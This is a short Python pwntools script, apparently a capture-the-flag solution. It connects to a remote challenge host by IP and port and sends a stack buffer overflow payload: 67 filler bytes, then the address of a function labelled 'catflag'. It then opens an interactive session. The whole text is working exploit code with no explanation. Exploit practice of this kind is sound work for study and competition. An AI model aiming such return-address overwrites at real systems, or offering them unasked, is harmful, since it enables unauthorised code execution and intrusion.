from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",46114)

catflag=0x080486CC

payload="a"*67+p32(catflag)
io.sendlineafter("> ",payload)

io.interactive()
